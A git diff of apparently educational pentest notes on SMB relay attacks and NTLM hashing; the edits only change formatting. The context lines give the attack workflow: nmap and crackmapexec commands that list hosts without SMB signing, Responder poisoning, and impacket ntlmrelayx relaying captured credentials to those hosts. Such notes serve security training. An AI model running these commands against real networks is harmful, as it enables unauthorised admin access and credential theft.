@@ -2,7 +2,7 @@
 
 ## <mark style="color:red;">SMB relay</mark>
 
-instead of cracking the hashes relay theme to specific machines and potentially gain access smb signing must be disabled on the target relayed user credentials must be admin on machine.
+Instead of cracking the hashes, relay theme to specific machines and potentially gain access. "SMB signing" must be disabled on the target, relayed user credentials must be admin on machine.
 
 ## <mark style="color:red;">NT/NTLM</mark>
 
@@ -50,7 +50,7 @@ The generated hash (16-bytes long) is padded with 5 null bytes making it a 21 by
 
 ![](<../../../.gitbook/assets/image (212).png>)
 
-Note: this is called NTLM hash that is different from the NT hash!!!
+#### <mark style="color:green;">Note: this is called NTLM hash that is different from the NT hash!!!</mark>
 
 This 21 bytes string is split in 3 blocks, 7 bytes long each + 1 parity byte. The response will be then 24 bytes long.
 
@@ -134,7 +134,7 @@ nano /usr/share/responder/Responder.conf
 
 ![](<../../../.gitbook/assets/image (221).png>)
 
-#### detect machines with smb signing disabled
+#### <mark style="color:green;">detect machines with smb signing disabled</mark>
 
 ```
  nmap --script smb2-security-mode -p 445 192.168.56.1/24
@@ -148,9 +148,7 @@ we can also use crackmapexec to generate a list of all hosts in a network with S
 crackmapexec smb 172.16.1.1/24 --gen-relay-list target.txt
 ```
 
-
-
-#### turn off smb and http in responder settings
+#### <mark style="color:green;">turn off smb and http in responder settings</mark>
 
 ```
 responder -I vboxnet0 -rdwv
@@ -160,7 +158,7 @@ apt install impacket-scripts
 python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support
 ```
 
-#### trigger the attack by opening the attacker ip in the user machine with smb relay turned off
+#### <mark style="color:green;">trigger the attack by opening the attacker ip in the user machine with smb relay turned off</mark>
 
 ![](<../../../.gitbook/assets/image (214).png>)
 
